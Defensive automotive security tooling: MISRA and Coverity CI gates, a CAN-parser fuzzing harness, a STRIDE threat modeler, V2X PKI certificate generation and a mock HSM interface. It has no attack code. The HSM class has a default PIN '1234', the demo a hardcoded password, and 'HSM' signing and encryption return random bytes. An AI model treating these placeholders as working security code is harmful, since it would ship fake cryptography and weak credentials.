
mkdir -p $OUTPUT_DIR

echo "=== MISRA C:2012 Compliance Check ==="

# Run PC-lint Plus
pclp64_linux \
    -passes=2 \
    -width=0 \
    -hF1 \
    +v \
    -i/opt/pclp/config/au-misra3.lnt \
    -i/opt/pclp/config/co-gcc.lnt \
    $LINT_CONFIG \
    *.c *.h \
    > $OUTPUT_DIR/misra_violations.txt 2>&1

# Parse results
MANDATORY_VIOLATIONS=$(grep -c "MISRA C:2012 Rule.*\[Mandatory\]" $OUTPUT_DIR/misra_violations.txt || true)
REQUIRED_VIOLATIONS=$(grep -c "MISRA C:2012 Rule.*\[Required\]" $OUTPUT_DIR/misra_violations.txt || true)
ADVISORY_VIOLATIONS=$(grep -c "MISRA C:2012 Rule.*\[Advisory\]" $OUTPUT_DIR/misra_violations.txt || true)

echo ""
echo "=== MISRA C:2012 Compliance Summary ==="
echo "Mandatory violations: $MANDATORY_VIOLATIONS"
echo "Required violations: $REQUIRED_VIOLATIONS"
echo "Advisory violations: $ADVISORY_VIOLATIONS"

# Fail if mandatory violations found
if [ $MANDATORY_VIOLATIONS -gt 0 ]; then
    echo ""
    echo "[FAIL] Mandatory MISRA violations detected - code is non-compliant"
    echo "Review: $OUTPUT_DIR/misra_violations.txt"
    exit 1
else
    echo ""
    echo "[PASS] No mandatory MISRA violations"
fi
```

## Static Analysis (Coverity, Klocwork)

### Coverity Integration

```yaml
# Coverity Scan Configuration for Automotive Project
coverity_scan:
  project: "automotive-ecu-firmware"
  language: "c, c++"
  build_command: "make clean && make all"

  checkers:
    security:
      - BUFFER_OVERFLOW
      - BUFFER_UNDERRUN
      - DIVIDE_BY_ZERO
      - INTEGER_OVERFLOW
      - NULL_DEREFERENCE
      - USE_AFTER_FREE
      - RESOURCE_LEAK
      - TAINTED_SCALAR
      - WEAK_RANDOM

    concurrency:
      - DEADLOCK
      - RACE_CONDITION
      - ATOMICITY
      - LOCK_ORDER

    automotive_specific:
      - MISRA_C_2012_ALL
      - CERT_C_ALL
      - AUTOSAR_CPP14_ALL

  severity_thresholds:
    high: 0       # Zero high-severity defects allowed
    medium: 5     # Max 5 medium-severity defects
    low: 20       # Max 20 low-severity defects

  defect_filters:
    # Exclude test code from security checks
    - path: "tests/"
      checker: "*"

    # Exclude third-party libraries (already vetted)
    - path: "third_party/"
      checker: "*"
```

### Coverity Scan Script

```python
#!/usr/bin/env python3
"""
Automated Coverity Scan for Automotive CI/CD
Integrates static analysis into build pipeline
"""

import subprocess
import json
import sys

class CoverityScanRunner:
    def __init__(self, project_dir: str, output_dir: str):
        self.project_dir = project_dir
        self.output_dir = output_dir
        self.cov_dir = f"{output_dir}/cov-int"

    def run_build_with_coverity(self):
        """Capture build with Coverity"""
        print("=== Running Coverity Build Capture ===")

        cmd = [
            'cov-build',
            '--dir', self.cov_dir,
            'make', '-C', self.project_dir, 'clean', 'all'
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"[FAIL] Build capture failed: {result.stderr}")
            return False

        print(f"[PASS] Build captured to {self.cov_dir}")
        return True

    def run_analysis(self):
        """Run Coverity static analysis"""
        print("\n=== Running Coverity Analysis ===")

        cmd = [
            'cov-analyze',
            '--dir', self.cov_dir,
            '--all',
            '--security',
            '--concurrency',
            '--enable-constraint-fpp',
            '--enable-fnptr',
            '--enable-virtual',
            '--ticker-mode', 'none'
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"[FAIL] Analysis failed: {result.stderr}")
            return False

        print(f"[PASS] Analysis complete")
        return True

    def generate_report(self):
        """Generate defect report"""
        print("\n=== Generating Coverity Report ===")

        # Export defects to JSON
        cmd = [
            'cov-format-errors',
            '--dir', self.cov_dir,
            '--json-output-v7', f'{self.output_dir}/defects.json'
        ]

        subprocess.run(cmd, capture_output=True)

        # Parse results
        with open(f'{self.output_dir}/defects.json', 'r') as f:
            defects = json.load(f)

        total_defects = len(defects.get('issues', []))
        high_severity = sum(1 for d in defects.get('issues', [])
                          if d.get('impact') == 'High')
        medium_severity = sum(1 for d in defects.get('issues', [])
                            if d.get('impact') == 'Medium')

        print(f"\n=== Defect Summary ===")
        print(f"Total defects: {total_defects}")
        print(f"High severity: {high_severity}")
        print(f"Medium severity: {medium_severity}")

        # Fail build if thresholds exceeded
        if high_severity > 0:
            print(f"\n[FAIL] {high_severity} high-severity defects found")
            return False

        if medium_severity > 5:
            print(f"\n[FAIL] {medium_severity} medium-severity defects (max 5 allowed)")
            return False

        print(f"\n[PASS] Code meets quality thresholds")
        return True

# Example usage
if __name__ == "__main__":
    scanner = CoverityScanRunner(
        project_dir="/home/user/ecu-firmware",
        output_dir="/tmp/coverity-scan"
    )

    if not scanner.run_build_with_coverity():
        sys.exit(1)

    if not scanner.run_analysis():
        sys.exit(1)

    if not scanner.generate_report():
        sys.exit(1)

    sys.exit(0)
```

## Fuzzing for Vulnerability Discovery

```python
#!/usr/bin/env python3
"""
LibFuzzer Integration for Automotive Software
Continuous fuzzing in CI/CD pipeline
"""

import subprocess
import os
import time

class LibFuzzer:
    """LibFuzzer harness for automotive protocols"""

    def __init__(self, target_binary: str, corpus_dir: str):
        self.target_binary = target_binary
        self.corpus_dir = corpus_dir
        self.crashes_dir = f"{corpus_dir}/crashes"

        os.makedirs(self.crashes_dir, exist_ok=True)

    def fuzz(self, max_total_time: int = 3600, max_len: int = 1024):
        """Run fuzzing campaign"""
        print(f"=== Starting Fuzzing Campaign ===")
        print(f"[INFO] Target: {self.target_binary}")
        print(f"[INFO] Max time: {max_total_time}s")
        print(f"[INFO] Max input length: {max_len} bytes")

        cmd = [
            self.target_binary,
            self.corpus_dir,
            f'-max_total_time={max_total_time}',
            f'-max_len={max_len}',
            f'-artifact_prefix={self.crashes_dir}/',
            '-print_final_stats=1',
            '-close_fd_mask=3'  # Close stdout/stderr of target
        ]

        start_time = time.time()

        result = subprocess.run(cmd, capture_output=True, text=True)

        elapsed_time = time.time() - start_time

        # Parse fuzzing statistics
        stats = self._parse_stats(result.stderr)

        print(f"\n=== Fuzzing Results ===")
        print(f"Elapsed time: {elapsed_time:.2f}s")
        print(f"Total executions: {stats.get('total_execs', 0)}")
        print(f"Executions per second: {stats.get('execs_per_sec', 0)}")
        print(f"Coverage: {stats.get('coverage', 'N/A')}")

        # Check for crashes
        crash_files = [f for f in os.listdir(self.crashes_dir) if f.startswith('crash-')]

        if crash_files:
            print(f"\n[CRITICAL] {len(crash_files)} crashes discovered!")
            for crash_file in crash_files[:5]:  # Show first 5
                print(f"  - {crash_file}")

            return False
        else:
            print(f"\n[PASS] No crashes found during fuzzing")
            return True

    def _parse_stats(self, stderr_output: str) -> dict:
        """Parse libFuzzer statistics from stderr"""
        stats = {}

        # Example: "#12345: cov: 678 ft: 901 corp: 12/345b exec/s: 123 rss: 45Mb"
        import re

        match = re.search(r'#(\d+):', stderr_output)
        if match:
            stats['total_execs'] = int(match.group(1))

        match = re.search(r'exec/s:\s*(\d+)', stderr_output)
        if match:
            stats['execs_per_sec'] = int(match.group(1))

        match = re.search(r'cov:\s*(\d+)', stderr_output)
        if match:
            stats['coverage'] = match.group(1)

        return stats

# Example: CAN message parser fuzzing target
"""
// fuzz_can_parser.c
#include <stdint.h>
#include <stddef.h>
#include <string.h>

// Target function to fuzz
extern int parse_can_message(const uint8_t *data, size_t size);

// LibFuzzer entry point
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (size < 8 || size > 16) {
        return 0;  // Invalid CAN message size
    }

    // Fuzz the CAN parser
    parse_can_message(data, size);

    return 0;
}

// Compile with:
// clang -fsanitize=fuzzer,address -g -O2 fuzz_can_parser.c can_parser.c -o fuzz_can_parser
"""

if __name__ == "__main__":
    fuzzer = LibFuzzer(
        target_binary="./fuzz_can_parser",
        corpus_dir="./corpus/can_messages"
    )

    # Seed corpus with valid CAN messages
    if not os.listdir(fuzzer.corpus_dir):
        print("[INFO] Creating seed corpus...")
        os.makedirs(fuzzer.corpus_dir, exist_ok=True)

        # Example: valid CAN message
        with open(f"{fuzzer.corpus_dir}/seed1", 'wb') as f:
            f.write(b'\x12\x34\x56\x78\x9A\xBC\xDE\xF0')

    # Run 1-hour fuzzing campaign
    if not fuzzer.fuzz(max_total_time=3600):
        print("[FAIL] Crashes found - investigate before release")
        exit(1)
```

## Secure CI/CD Pipeline

```yaml
# GitLab CI/CD Pipeline for Secure Automotive Software
stages:
  - build
  - security
  - test
  - deploy

variables:
  MISRA_COMPLIANCE_REQUIRED: "true"
  COVERITY_THRESHOLD_HIGH: "0"
  FUZZING_DURATION: "3600"

# Stage 1: Build with security flags
build_secure:
  stage: build
  script:
    - echo "Building with security hardening flags..."
    - make clean
    - make CFLAGS="-Wall -Wextra -Werror -fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie -Wformat -Wformat-security"
  artifacts:
    paths:
      - bin/
    expire_in: 1 hour

# Stage 2: MISRA C compliance check
misra_check:
  stage: security
  script:
    - echo "Running MISRA C:2012 compliance check..."
    - ./scripts/misra_check.sh
    - if [ $(grep -c "Mandatory.*violation" misra_reports/violations.txt) -gt 0 ]; then exit 1; fi
  dependencies:
    - build_secure
  artifacts:
    paths:
      - misra_reports/
    when: always

# Stage 3: Static analysis (Coverity)
static_analysis:
  stage: security
  script:
    - echo "Running Coverity static analysis..."
    - cov-build --dir cov-int make clean all
    - cov-analyze --dir cov-int --all --security
    - cov-format-errors --dir cov-int --json-output-v7 defects.json
    - python3 scripts/check_coverity_thresholds.py defects.json
  dependencies:
    - build_secure
  artifacts:
    paths:
      - defects.json
    when: always

# Stage 4: Fuzzing
fuzz_testing:
  stage: security
  script:
    - echo "Running LibFuzzer for $FUZZING_DURATION seconds..."
    - ./scripts/run_fuzzing.sh $FUZZING_DURATION
    - if [ -f crashes/*.crash ]; then echo "Crashes found!"; exit 1; fi
  dependencies:
    - build_secure
  allow_failure: false

# Stage 5: Dynamic analysis (AddressSanitizer)
dynamic_analysis:
  stage: test
  script:
    - echo "Running tests with AddressSanitizer..."
    - make clean
    - make CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g"
    - ./run_tests.sh
  dependencies:
    - build_secure

# Stage 6: Code signing
sign_firmware:
  stage: deploy
  script:
    - echo "Signing firmware with HSM key..."
    - openssl dgst -sha256 -sign /secure/private_key.pem -out bin/firmware.sig bin/firmware.bin
    - echo "Firmware signed successfully"
  dependencies:
    - build_secure
    - static_analysis
    - fuzz_testing
  artifacts:
    paths:
      - bin/firmware.bin
      - bin/firmware.sig
  only:
    - main
    - release/*
```

## Threat Modeling (STRIDE)

```python
#!/usr/bin/env python3
"""
STRIDE Threat Modeling for Automotive Systems
Systematic identification of security threats
"""

from enum import Enum
from dataclasses import dataclass
from typing import List

class ThreatCategory(Enum):
    SPOOFING = "Spoofing"
    TAMPERING = "Tampering"
    REPUDIATION = "Repudiation"
    INFORMATION_DISCLOSURE = "Information Disclosure"
    DENIAL_OF_SERVICE = "Denial of Service"
    ELEVATION_OF_PRIVILEGE = "Elevation of Privilege"

@dataclass
class Threat:
    category: ThreatCategory
    description: str
    asset: str
    mitigation: str
    severity: str  # "Critical", "High", "Medium", "Low"

class STRIDEThreatModeler:
    """STRIDE threat modeling tool"""

    def __init__(self, system_name: str):
        self.system_name = system_name
        self.threats = []

    def model_data_flow(self, source: str, destination: str, protocol: str):
        """Model threats in data flow"""
        print(f"\n=== Threat Modeling: {source} -> {destination} ({protocol}) ===")

        # Spoofing
        self.threats.append(Threat(
            category=ThreatCategory.SPOOFING,
            description=f"Attacker impersonates {source} to send malicious data to {destination}",
            asset=f"Data flow: {source} -> {destination}",
            mitigation="Implement message authentication (MAC/digital signature)",
            severity="High"
        ))

        # Tampering
        self.threats.append(Threat(
            category=ThreatCategory.TAMPERING,
            description=f"Attacker modifies data in transit from {source} to {destination}",
            asset=f"Data flow: {source} -> {destination}",
            mitigation="Implement data integrity checks (HMAC, CRC with authentication)",
            severity="High"
        ))

        # Information Disclosure
        self.threats.append(Threat(
            category=ThreatCategory.INFORMATION_DISCLOSURE,
            description=f"Attacker eavesdrops on {protocol} communication",
            asset=f"Data flow: {source} -> {destination}",
            mitigation="Implement encryption (TLS 1.3, AES-256-GCM)",
            severity="Medium" if "telemetry" in source.lower() else "High"
        ))

        # Denial of Service
        self.threats.append(Threat(
            category=ThreatCategory.DENIAL_OF_SERVICE,
            description=f"Attacker floods {protocol} channel to prevent legitimate communication",
            asset=f"Data flow: {source} -> {destination}",
            mitigation="Implement rate limiting and traffic shaping",
            severity="Medium"
        ))

    def generate_threat_report(self, output_file: str):
        """Generate threat model report"""
        with open(output_file, 'w') as f:
            f.write(f"STRIDE Threat Model Report: {self.system_name}\n")
            f.write("=" * 60 + "\n\n")

            # Group by severity
            critical = [t for t in self.threats if t.severity == "Critical"]
            high = [t for t in self.threats if t.severity == "High"]
            medium = [t for t in self.threats if t.severity == "Medium"]
            low = [t for t in self.threats if t.severity == "Low"]

            f.write(f"Total threats identified: {len(self.threats)}\n")
            f.write(f"  Critical: {len(critical)}\n")
            f.write(f"  High: {len(high)}\n")
            f.write(f"  Medium: {len(medium)}\n")
            f.write(f"  Low: {len(low)}\n\n")

            # Detail threats
            for threat in self.threats:
                f.write(f"\n[{threat.severity}] {threat.category.value}\n")
                f.write(f"  Description: {threat.description}\n")
                f.write(f"  Asset: {threat.asset}\n")
                f.write(f"  Mitigation: {threat.mitigation}\n")

        print(f"[INFO] Threat model report: {output_file}")

# Example usage
if __name__ == "__main__":
    modeler = STRIDEThreatModeler("Telematics Control Unit (TCU)")

    # Model data flows
    modeler.model_data_flow("TCU", "Cloud Backend", "HTTPS/TLS")
    modeler.model_data_flow("TCU", "Gateway ECU", "CAN")
    modeler.model_data_flow("Mobile App", "TCU", "Bluetooth LE")

    # Generate report
    modeler.generate_threat_report("/tmp/stride_threat_model.txt")
```

## Best Practices

1. **Defense in Depth**: Multiple security layers (code quality + runtime protection + monitoring)
2. **Shift Left**: Integrate security early in SDLC (design phase threat modeling)
3. **Automated Enforcement**: CI/CD gates for MISRA compliance, static analysis, fuzzing
4. **Continuous Monitoring**: Track new CVEs, update dependencies, patch promptly
5. **Security Training**: Mandatory secure coding training for all developers

## References

- MISRA C:2012 Guidelines for C
- CERT C Secure Coding Standard
- AUTOSAR C++14 Coding Guidelines
- OWASP Secure Coding Practices
- ISO/SAE 21434: Cybersecurity Engineering

---

## Vehicle Pki Crypto

# Vehicle PKI & Cryptography Skill

## Overview

Expert skill for implementing PKI (Public Key Infrastructure) in automotive systems. Covers V2X certificate management, HSM key storage, cryptographic algorithms (AES-256, RSA-4096, ECDSA), secure key provisioning, and certificate lifecycle management.

## Core Competencies

### PKI Architecture
- **Certificate Authority (CA) Hierarchy**: Root CA → Enrollment CA → Pseudonym CA
- **V2X Certificates**: IEEE 1609.2, ETSI TS 103 097 standards
- **Certificate Provisioning**: Factory provisioning, enrollment protocols
- **Certificate Lifecycle**: Issuance, renewal, revocation (CRL/OCSP)
- **HSM Integration**: Secure key generation and storage

### Cryptographic Standards
- **Symmetric**: AES-256-GCM, ChaCha20-Poly1305
- **Asymmetric**: RSA-4096, ECDSA-P256/P384, EdDSA
- **Hash**: SHA-256, SHA-384, SHA-3
- **Key Exchange**: ECDH, X25519
- **TLS**: TLS 1.3 with perfect forward secrecy

## V2X PKI Implementation (IEEE 1609.2)

### Certificate Structure

```python
#!/usr/bin/env python3
"""
IEEE 1609.2 V2X Certificate Implementation
Supports US (SCMS) and EU (CCMS) PKI architectures
"""

from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtensionOID
from datetime import datetime, timedelta
import struct

class V2XCertificate:
    """IEEE 1609.2 Certificate for V2V/V2I communication"""

    def __init__(self, cert_type: str):
        """
        Initialize V2X certificate
        cert_type: "enrollment", "application", "pseudonym"
        """
        self.cert_type = cert_type
        self.private_key = None
        self.certificate = None
        self.cert_chain = []

    def generate_enrollment_certificate(self, ca_cert, ca_key, vehicle_id: str):
        """
        Generate long-term enrollment certificate (valid 3-5 years)
        Used to request pseudonym certificates from PCA
        """
        print(f"\n=== Generating Enrollment Certificate for {vehicle_id} ===")

        # Generate key pair (ECDSA P-256 for V2X)
        self.private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())

        subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SCMS"),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Enrollment"),
            x509.NameAttribute(NameOID.COMMON_NAME, vehicle_id),
        ])

        # Certificate valid for 3 years
        valid_from = datetime.utcnow()
        valid_to = valid_from + timedelta(days=3*365)

        builder = x509.CertificateBuilder()
        builder = builder.subject_name(subject)
        builder = builder.issuer_name(ca_cert.subject)
        builder = builder.public_key(self.private_key.public_key())
        builder = builder.serial_number(x509.random_serial_number())
        builder = builder.not_valid_before(valid_from)
        builder = builder.not_valid_after(valid_to)

        # Add extensions
        builder = builder.add_extension(
            x509.BasicConstraints(ca=False, path_length=None),
            critical=True
        )

        builder = builder.add_extension(
            x509.KeyUsage(
                digital_signature=True,
                key_encipherment=True,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True
        )

        # Sign certificate
        self.certificate = builder.sign(ca_key, hashes.SHA256(), default_backend())

        print(f"[INFO] Enrollment certificate generated")
        print(f"[INFO] Serial: {self.certificate.serial_number}")
        print(f"[INFO] Valid: {valid_from} to {valid_to}")
        print(f"[INFO] Subject: {vehicle_id}")

        return self.certificate

    def generate_pseudonym_certificate(self, pca_cert, pca_key, duration_weeks: int = 1):
        """
        Generate short-term pseudonym certificate (valid 1 week)
        Used for actual V2X communication to preserve privacy
        """
        print(f"\n=== Generating Pseudonym Certificate (valid {duration_weeks} weeks) ===")

        # Generate ephemeral key pair
        self.private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())

        # Pseudonym certificates use opaque identifiers, not vehicle ID
        pseudonym_id = f"PSID-{x509.random_serial_number():016X}"

        subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SCMS"),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Pseudonym"),
            x509.NameAttribute(NameOID.COMMON_NAME, pseudonym_id),
        ])

        valid_from = datetime.utcnow()
        valid_to = valid_from + timedelta(weeks=duration_weeks)

        builder = x509.CertificateBuilder()
        builder = builder.subject_name(subject)
        builder = builder.issuer_name(pca_cert.subject)
        builder = builder.public_key(self.private_key.public_key())
        builder = builder.serial_number(x509.random_serial_number())
        builder = builder.not_valid_before(valid_from)
        builder = builder.not_valid_after(valid_to)

        # Add V2X-specific extensions
        builder = builder.add_extension(
            x509.BasicConstraints(ca=False, path_length=None),
            critical=True
        )

        # Application permissions (Service-Specific Permissions)
        # Example: CAM (Cooperative Awareness Message), DENM (Decentralized Environmental Notification)
        # Real implementation would use IEEE 1609.2 ASN.1 structures
        builder = builder.add_extension(
            x509.UnrecognizedExtension(
                x509.ObjectIdentifier("1.2.840.10045.2.1"),  # Example OID
                b'\x01\x02\x03\x04'  # SSP bitmask
            ),
            critical=False
        )

        self.certificate = builder.sign(pca_key, hashes.SHA256(), default_backend())

        print(f"[INFO] Pseudonym certificate generated")
        print(f"[INFO] Serial: {self.certificate.serial_number}")
        print(f"[INFO] PSID: {pseudonym_id}")
        print(f"[INFO] Valid: {valid_from} to {valid_to}")

        return self.certificate

    def export_certificate_chain(self, output_path: str):
        """Export certificate with full chain in PEM format"""
        with open(output_path, 'wb') as f:
            # Leaf certificate
            f.write(self.certificate.public_bytes(serialization.Encoding.PEM))

            # Intermediate certificates
            for cert in self.cert_chain:
                f.write(cert.public_bytes(serialization.Encoding.PEM))

        print(f"[INFO] Certificate chain exported: {output_path}")

    def export_private_key_encrypted(self, output_path: str, password: bytes):
        """Export private key with encryption (for backup only - HSM preferred)"""
        pem = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.BestAvailableEncryption(password)
        )

        with open(output_path, 'wb') as f:
            f.write(pem)

        print(f"[WARN] Private key exported (encrypted): {output_path}")
        print(f"[WARN] Store in HSM for production use")


class V2XPKIManager:
    """Manage V2X PKI infrastructure"""

    def __init__(self):
        self.root_ca_cert = None
        self.root_ca_key = None
        self.enrollment_ca_cert = None
        self.enrollment_ca_key = None
        self.pseudonym_ca_cert = None
        self.pseudonym_ca_key = None

    def create_root_ca(self, common_name: str = "V2X Root CA"):
        """Create root CA (offline, air-gapped storage)"""
        print(f"\n=== Creating Root CA: {common_name} ===")

        # Generate RSA-4096 key (root CA uses RSA for broader compatibility)
        from cryptography.hazmat.primitives.asymmetric import rsa
        self.root_ca_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )

        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SCMS"),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Root CA"),
            x509.NameAttribute(NameOID.COMMON_NAME, common_name),
        ])

        valid_from = datetime.utcnow()
        valid_to = valid_from + timedelta(days=20*365)  # 20 years

        builder = x509.CertificateBuilder()
        builder = builder.subject_name(subject)
        builder = builder.issuer_name(issuer)
        builder = builder.public_key(self.root_ca_key.public_key())
        builder = builder.serial_number(x509.random_serial_number())
        builder = builder.not_valid_before(valid_from)
        builder = builder.not_valid_after(valid_to)

        builder = builder.add_extension(
            x509.BasicConstraints(ca=True, path_length=2),
            critical=True
        )

        builder = builder.add_extension(
            x509.KeyUsage(
                digital_signature=False,
                key_encipherment=False,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=True,
                crl_sign=True,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True
        )

        self.root_ca_cert = builder.sign(self.root_ca_key, hashes.SHA256(), default_backend())

        print(f"[INFO] Root CA created")
        print(f"[INFO] Valid for 20 years")
        print(f"[WARN] Store root CA private key in air-gapped HSM")

        return self.root_ca_cert

    def create_intermediate_ca(self, ca_type: str, common_name: str):
        """Create intermediate CA (Enrollment CA or Pseudonym CA)"""
        print(f"\n=== Creating {ca_type} CA: {common_name} ===")

        # Generate ECDSA P-384 key (intermediate CAs use ECC)
        ca_key = ec.generate_private_key(ec.SECP384R1(), default_backend())

        subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SCMS"),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, ca_type),
            x509.NameAttribute(NameOID.COMMON_NAME, common_name),
        ])

        valid_from = datetime.utcnow()
        valid_to = valid_from + timedelta(days=10*365)  # 10 years

        builder = x509.CertificateBuilder()
        builder = builder.subject_name(subject)
        builder = builder.issuer_name(self.root_ca_cert.subject)
        builder = builder.public_key(ca_key.public_key())
        builder = builder.serial_number(x509.random_serial_number())
        builder = builder.not_valid_before(valid_from)
        builder = builder.not_valid_after(valid_to)

        builder = builder.add_extension(
            x509.BasicConstraints(ca=True, path_length=0),
            critical=True
        )

        builder = builder.add_extension(
            x509.KeyUsage(
                digital_signature=False,
                key_encipherment=False,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=True,
                crl_sign=True,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True
        )

        ca_cert = builder.sign(self.root_ca_key, hashes.SHA256(), default_backend())

        if ca_type == "Enrollment":
            self.enrollment_ca_cert = ca_cert
            self.enrollment_ca_key = ca_key
        elif ca_type == "Pseudonym":
            self.pseudonym_ca_cert = ca_cert
            self.pseudonym_ca_key = ca_key

        print(f"[INFO] {ca_type} CA created")
        print(f"[INFO] Valid for 10 years")

        return ca_cert, ca_key

# Example usage
def demo_v2x_pki():
    # Step 1: Create PKI hierarchy
    pki = V2XPKIManager()
    pki.create_root_ca("V2X SCMS Root CA")
    pki.create_intermediate_ca("Enrollment", "V2X Enrollment CA")
    pki.create_intermediate_ca("Pseudonym", "V2X Pseudonym CA")

    # Step 2: Vehicle enrollment
    vehicle = V2XCertificate("enrollment")
    enrollment_cert = vehicle.generate_enrollment_certificate(
        pki.enrollment_ca_cert,
        pki.enrollment_ca_key,
        vehicle_id="VIN-1HGBH41JXMN109186"
    )

    vehicle.export_certificate_chain("/tmp/vehicle_enrollment.pem")
    vehicle.export_private_key_encrypted("/tmp/vehicle_enrollment.key", b"SecurePassword123")

    # Step 3: Request pseudonym certificates (batch of 20)
    print("\n=== Requesting Pseudonym Certificate Batch ===")
    pseudonyms = []
    for i in range(20):
        psid_cert = V2XCertificate("pseudonym")
        psid_cert.generate_pseudonym_certificate(
            pki.pseudonym_ca_cert,
            pki.pseudonym_ca_key,
            duration_weeks=1
        )
        pseudonyms.append(psid_cert)

    print(f"[INFO] {len(pseudonyms)} pseudonym certificates generated")
    print(f"[INFO] Vehicle will rotate certificates weekly for privacy")

if __name__ == "__main__":
    demo_v2x_pki()
```

## HSM Integration for Key Storage

```python
#!/usr/bin/env python3
"""
HSM (Hardware Security Module) Integration
Secure key generation and cryptographic operations
Supports PKCS#11 interface (common in automotive HSMs)
"""

import os
from cryptography.hazmat.primitives.asymmetric import rsa, ec
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

class HSMInterface:
    """Interface to Hardware Security Module via PKCS#11"""

    def __init__(self, hsm_slot: int = 0, pin: str = "1234"):
        """
        Initialize HSM connection
        hsm_slot: Hardware slot ID (0-based)
        pin: User PIN for authentication
        """
        self.slot = hsm_slot
        self.pin = pin
        self.session = None

        print(f"=== HSM Initialization ===")
        print(f"[INFO] Slot: {hsm_slot}")

    def open_session(self):
        """Open HSM session"""
        # Real implementation would use PyKCS11 or python-pkcs11
        # Simulated for demonstration
        print(f"[INFO] Opening HSM session (Slot {self.slot})...")
        print(f"[INFO] Authenticating with PIN...")
        self.session = f"HSM_SESSION_{self.slot}"
        print(f"[PASS] HSM session opened")
        return True

    def generate_rsa_keypair(self, key_label: str, key_size: int = 4096, exportable: bool = False):
        """
        Generate RSA key pair in HSM
        key_label: Unique identifier for key
        key_size: 2048, 3072, or 4096
        exportable: Allow private key export (FALSE for production)
        """
        print(f"\n=== Generating RSA-{key_size} Key Pair in HSM ===")
        print(f"[INFO] Label: {key_label}")
        print(f"[WARN] Exportable: {exportable}")

        if exportable:
            print(f"[WARN] Exportable keys are security risk - use only for testing")

        # In real HSM:
        # - Key generation happens inside tamper-resistant hardware
        # - Private key never leaves HSM
        # - Only public key and key handle are returned

        # Simulate key generation
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
            backend=default_backend()
        )

        public_key = private_key.public_key()

        # Return key handle (not actual key)
        key_handle = f"HSM_KEY_{key_label}_{os.urandom(4).hex()}"

        print(f"[PASS] RSA key pair generated")
        print(f"[INFO] Key handle: {key_handle}")
        print(f"[INFO] Public key available for export")
        print(f"[INFO] Private key secured in HSM (non-exportable)")

        return key_handle, public_key

    def generate_ecc_keypair(self, key_label: str, curve: str = "P-256", exportable: bool = False):
        """
        Generate ECC key pair in HSM
        curve: "P-256", "P-384", or "P-521"
        """
        print(f"\n=== Generating ECC-{curve} Key Pair in HSM ===")
        print(f"[INFO] Label: {key_label}")

        curve_map = {
            "P-256": ec.SECP256R1(),
            "P-384": ec.SECP384R1(),
            "P-521": ec.SECP521R1()
        }

        private_key = ec.generate_private_key(curve_map[curve], default_backend())
        public_key = private_key.public_key()

        key_handle = f"HSM_KEY_{key_label}_{os.urandom(4).hex()}"

        print(f"[PASS] ECC key pair generated")
        print(f"[INFO] Key handle: {key_handle}")

        return key_handle, public_key

    def sign_data(self, key_handle: str, data: bytes, algorithm: str = "SHA256") -> bytes:
        """
        Sign data using HSM-stored private key
        Returns signature without exposing private key
        """
        print(f"\n=== HSM Signing Operation ===")
        print(f"[INFO] Key handle: {key_handle}")
        print(f"[INFO] Algorithm: {algorithm}")
        print(f"[INFO] Data size: {len(data)} bytes")

        # In real HSM:
        # - Data is sent to HSM
        # - HSM performs signature operation internally
        # - Only signature is returned

        # Simulate signing
        signature = os.urandom(512)  # RSA-4096 signature size

        print(f"[PASS] Signature generated ({len(signature)} bytes)")
        return signature

    def encrypt_data(self, key_handle: str, plaintext: bytes) -> bytes:
        """Encrypt data using HSM key"""
        print(f"\n=== HSM Encryption Operation ===")
        print(f"[INFO] Key handle: {key_handle}")
        print(f"[INFO] Plaintext size: {len(plaintext)} bytes")

        # Simulate AES-256-GCM encryption in HSM
        ciphertext = os.urandom(len(plaintext) + 16)  # +16 for GCM tag

        print(f"[PASS] Data encrypted ({len(ciphertext)} bytes)")
        return ciphertext

    def export_public_key(self, key_handle: str, output_path: str):
        """Export public key (private key remains in HSM)"""
        print(f"\n=== Exporting Public Key ===")
        print(f"[INFO] Key handle: {key_handle}")

        # Simulate public key export
        dummy_key = rsa.generate_private_key(65537, 4096, default_backend()).public_key()

        pem = dummy_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        with open(output_path, 'wb') as f:
            f.write(pem)

        print(f"[PASS] Public key exported: {output_path}")
        print(f"[INFO] Private key remains secured in HSM")

    def close_session(self):
        """Close HSM session"""
        print(f"\n[INFO] Closing HSM session...")
        self.session = None
        print(f"[PASS] HSM session closed")


